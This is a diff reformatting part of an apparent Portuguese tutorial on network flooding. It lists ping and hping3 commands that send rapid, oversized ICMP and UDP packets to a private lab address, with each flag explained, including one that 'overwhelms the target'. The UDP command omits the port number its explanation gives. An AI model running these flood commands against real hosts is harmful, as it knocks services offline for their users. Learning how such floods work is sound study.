@@ -16,34 +16,34 @@ Facilmente de ser detectado.
 
 **Entrando em prática**
 
-    ping  192.168.200.7 -i 0.1 -s 6500
+`ping  192.168.200.7 -i 0.1 -s 6500`
 
-`-i é o intervalo entre os envios de pacote`
+- -i é o intervalo entre os envios de pacote
 
-`0.1 é o tempo em segundos para o envio de cada ping`
+- 0.1 é o tempo em segundos para o envio de cada ping
 
-`-s define o tamanho do pacote`
+- -s define o tamanho do pacote
 
-`6500 é o tamanho do pacote em bytes`
+- 6500 é o tamanho do pacote em bytes
 
-    sudo hping3 --icmptype 8 192.168.200.7 --flood --data 6500
+`sudo hping3 --icmptype 8 192.168.200.7 --flood --data 6500`
 
-`--icmptype 8: Envia pacotes ICMP do tipo Echo Request`
+- --icmptype 8: Envia pacotes ICMP do tipo Echo Request
 
-`192\.168.200.7: IP de destino (servidor)`
+- 192\.168.200.7: IP de destino (servidor)
 
-`--flood: Envia os pacotes continuamente para sobrecarregar o alvo`
+- --flood: Envia os pacotes continuamente para sobrecarregar o alvo
 
-`--data 6500: Tamanho do pacote em bytes`
+- --data 6500: Tamanho do pacote em bytes
 
-    sudo hping3 --udp 192.168.200.7 --flood -p --data 6500
+`sudo hping3 --udp 192.168.200.7 --flood -p --data 6500`
 
-`--udp: Define o protocolo como UDP`
+- --udp: Define o protocolo como UDP
 
-`192\.168.200.7: IP de destino (servidor)`
+- 192\.168.200.7: IP de destino (servidor)
 
-`--flood: Envia pacotes continuamente`
+- --flood: Envia pacotes continuamente
 
-`-p 80: Porta de destino (geralmente usada para HTTP)`
+- -p 80: Porta de destino (geralmente usada para HTTP)
 
-`--data 6500: Tamanho do pacote em bytes`
+- --data 6500: Tamanho do pacote em bytes
